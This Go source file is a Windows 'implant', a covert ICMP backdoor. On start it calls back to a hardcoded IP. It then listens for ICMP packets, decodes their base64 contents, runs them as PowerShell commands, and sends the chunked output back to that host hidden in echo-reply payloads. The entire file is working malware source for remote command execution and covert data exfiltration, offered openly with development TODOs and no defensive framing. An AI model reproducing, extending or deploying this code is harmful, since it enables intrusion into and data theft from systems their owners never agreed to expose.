// This is the code for the full on implant for windows targets

// TODO: Chunk data into queues
// TODO: Create Checkin routine with relevant data
// TODO: Implement secret Message for initial callback

package main

import (
	// Base Libs
	//"context"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	uuid "github.com/satori/go.uuid"
	"log"
	"net"
	"os"
	"os/exec"
	//"syscall"
	"time"
	//"unsafe"

	// External Libs
	"github.com/kirito41dd/xslice"
	//"github.com/satori/go.uuid"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

const (
	secretMessage = "Activate"
	targetIP      = "10.20.214.167"
)

func NewCallBack() {
	agentUuid := (uuid.NewV4()).String()
	data := EncodeData(agentUuid)
	SendData(data, 3)
	return
}

// SplitData is a function that will just take in a byte array and return it into a multi dimensional array
func SplitData(data []byte, chunkSize int) [][]byte {
	i := xslice.SplitToChunks(data, chunkSize)
	ss := i.([][]byte)
	return ss

}

// EncodeData is a function that takes in a byte array and Encodes it into a b64 string
func EncodeData(input string) string {
	data := base64.StdEncoding.EncodeToString([]byte(input))
	return data
}

// SendData is a function that handles the sending of ICMP data within the payload header
// it takes in a string (should be b64'd) and a seq number (not really needed but good to include based on RFC).
func SendData(data string, seq int) {
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		log.Fatal(err)
	}

	wm := icmp.Message{
		Type: ipv4.ICMPTypeEchoReply, Code: 0,
		Body: &icmp.Echo{
			ID: os.Getpid() & 0xffff, Seq: seq,
			Data: []byte(data),
		},
	}

	wb, err := wm.Marshal(nil)
	if err != nil {
		log.Fatal(err)
	}
	if _, err := conn.WriteTo(wb, &net.IPAddr{IP: net.ParseIP(targetIP)}); err != nil {
		log.Fatalf("WriteTo err, %s", err)
	}

}

// PingListen is a function that handles the "server" portion of the implant
// Which will just listen for ICMP traffic, parse it, decode it, and then send it to a new powershell process
// in which it will then execute the command it received, encode it, and send it out
// Added a chunking portion that handles large data outputs
func PingListen(buf []byte, packetData int) {

	//fmt.Println("[+] The full packet data:")
	//fmt.Printf("% X\n", buf[:packetData])

	fmt.Println("Inside PingListen")
	src := buf[8:packetData]

	hexToString := hex.EncodeToString(src)
	fmt.Println(hexToString)

	hexDecode, _ := hex.DecodeString(hexToString)

	base64Text := make([]byte, base64.StdEncoding.DecodedLen(len(hexDecode)))
	decode, _ := base64.StdEncoding.Decode(base64Text, []byte(hexDecode))

	command := base64Text[:decode]

	output, _ := exec.Command("powershell.exe", "/c", string(command)).Output()

	if len(output) > 6100 {
		chunked := SplitData(output, 3000)
		for _, row := range chunked {
			data := EncodeData(string(row))
			SendData(data, 3)
			time.Sleep(2 * time.Second)
		}

	}

	data := EncodeData(string(output))
	SendData(data, 3)

}

func init() {
	NewCallBack()
}

func main() {

	// while True loop to listen for ICMP data
	for {

		protocol := "icmp"

		netaddr, err := net.ResolveIPAddr("ip4", "0.0.0.0")
		if err != nil {
			fmt.Printf("[-] Error in Resolve IPAddr: %s\n\n", err)
		}

		conn, err := net.ListenIP("ip4:"+protocol, netaddr)
		if err != nil {
			fmt.Printf("[-] Error in ListenIP: %s\n\n", err)
		}
		fmt.Println("After ListenIP")

		buf := make([]byte, 100000)
		fmt.Println("After buf call")

		packetData, _, err := conn.ReadFrom(buf)
		fmt.Println("Before error check for conn.ReadFrom")
		if err != nil {
			fmt.Printf("[+] Error reading packet data, %s\n\n", err)
		}

		fmt.Println("Right before PingListen call")
		go PingListen(buf, packetData)

	}
}
